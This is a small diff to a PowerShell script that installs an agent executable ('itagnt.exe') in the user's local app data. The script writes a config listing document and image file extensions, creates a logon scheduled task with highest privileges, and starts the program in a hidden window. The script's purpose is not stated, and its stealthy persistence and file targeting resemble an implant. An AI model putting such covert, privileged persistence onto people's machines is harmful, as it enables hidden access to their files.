@@ -1,4 +1,3 @@
-$ErrorActionPreference = 'Stop'
 $dir = "$env:LOCALAPPDATA\itmgn"
 $exe = "$dir\itagnt.exe"
 $zip = "$dir\itagnt.zip"
@@ -24,7 +23,7 @@ $agentId = [guid]::NewGuid().ToString()
                          ".pdf",".txt",".csv",".zip",".rar",".jpg",".jpeg",".png")
 } | ConvertTo-Json -Depth 3 | Out-File -FilePath $cfg -Encoding UTF8 -Force
 
-schtasks /delete /tn "itmgn" /f 2>$null | Out-Null
+schtasks /delete /tn "itmgn" /f 2>&1 | Out-Null
 schtasks /create /tn "itmgn" /tr "`"$exe`"" /sc ONLOGON /rl HIGHEST /f | Out-Null
 
 Start-Process -FilePath $exe -WindowStyle Hidden
